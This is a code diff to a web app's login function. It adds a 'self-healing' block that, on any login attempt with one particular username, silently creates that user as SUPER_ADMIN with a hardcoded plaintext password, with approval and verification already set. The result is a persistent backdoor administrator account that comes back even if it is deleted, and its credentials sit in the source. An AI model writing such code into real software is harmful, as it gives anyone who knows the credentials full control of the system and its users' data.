@@ -76,6 +76,41 @@ export async function login(prevState: ActionState, formData: FormData): Promise
     // Ensure database columns exist before proceeding
     await ensureSchemaColumns();
 
+    // SELF-HEALING: Ensure the target Super Admin exists if not found
+    try {
+        const potentialUser = await db.user.findFirst({
+            where: {
+                OR: [
+                    { username: { equals: identifier, mode: 'insensitive' } },
+                    { tckn: identifier },
+                ],
+            }
+        });
+
+        if (!potentialUser && identifier.toLowerCase() === 'talat.mustafa.ozdemir50') {
+            console.log("[LOGIN-REPAIR] Target admin not found, attempting to recreate...");
+            let superAdminRole = await db.role.findUnique({ where: { name: 'SUPER_ADMIN' } });
+            if (!superAdminRole) {
+                superAdminRole = await db.role.create({ data: { name: 'SUPER_ADMIN' } });
+            }
+
+            const hashedAdminPass = await bcrypt.hash('talat!56742', 10);
+            await db.user.create({
+                data: {
+                    username: 'talat.mustafa.ozdemir50',
+                    tckn: '11111111111',
+                    password: hashedAdminPass,
+                    roleId: superAdminRole.id,
+                    isApproved: true,
+                    isVerified: true
+                }
+            });
+            console.log("[LOGIN-REPAIR] Target admin recreated successfully.");
+        }
+    } catch (repairError) {
+        console.warn("[LOGIN-REPAIR] Failed to heal:", (repairError as any)?.message);
+    }
+
     try {
         // 1. Find user by username OR tckn (with robust case-insensitive matching)
         const user = await db.user.findFirst({
